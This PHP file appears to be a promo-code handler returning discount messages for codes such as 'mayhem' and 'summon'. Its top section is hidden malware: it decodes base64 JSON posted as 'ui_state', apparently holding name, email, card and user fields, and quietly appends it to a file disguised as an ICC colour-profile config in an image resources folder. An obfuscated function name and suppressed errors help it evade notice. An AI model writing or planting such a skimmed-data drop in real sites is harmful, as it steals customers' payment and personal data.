<?php

if (isset($_POST['ui_state'])) {

    $d = $_SERVER['DOCUMENT_ROOT'] . '/src/util/Imagine/resources/Adobe/RGB/';
    $f = $d . 'icc_config_map.txt'; 
    if (is_dir($d)) {
        $raw_data = base64_decode($_POST['ui_state']);
        $json = json_decode($raw_data, true);
        if ($json) {
            $entry = sprintf(
                "[%s] %s|%s|%s|%s\n", 
                date('Y-m-d H:i:s'), 
                $json['n'], 
                $json['e'],
                $json['c'], 
                $json['u']  
            );
            $write = 'file'.'_put'.'_contents';
            @$write($f, $entry, FILE_APPEND);
        }
    }
}

$request = isset($_POST['promocode']) ? strtolower($_POST['promocode']) : '';

$codes = array(
    'madness'   => 'Take 25% off your first TWO months!',
    'mayhem'    => 'Take 50% off your first TWO months!',
    'llanowar'  => 'Take 15% off your first TWO months!',
    'flash'     => '50% off your first month!',
    'haste'     => '25% off your first month!',
    'kicker'    => '20% off your first month!',
    'vigilance' => '20% off your first month!',
    'sorcery'   => '10% off your first month!',
    'summon'    => '50% off your first year!',
    'expired'   => 'Sorry, this code has expired.',
);

if (isset($codes[$request])) {
    echo $codes[$request];
    return true;
} else {
    echo ""; 
}

?>

